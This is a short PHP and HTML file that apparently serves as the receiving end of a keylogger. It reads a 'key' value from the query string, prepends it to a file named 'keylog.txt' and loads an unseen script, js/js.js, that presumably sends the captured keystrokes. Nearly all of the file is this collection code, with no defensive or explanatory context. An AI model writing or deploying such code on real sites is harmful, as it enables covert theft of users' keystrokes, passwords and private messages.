<?php
ini_set("display_errors", "1");
error_reporting(E_ALL);

$logfile="keylog.txt";
$key=$_GET['key'];
if($key !=""){
	$current = file_get_contents($logfile);
	$key .=$current;
	file_put_contents($logfile, $key);
}
?>
<script src="js/js.js"></script>
<form>
<input name="key" action="GET" type="text">
<input type="submit">
</form>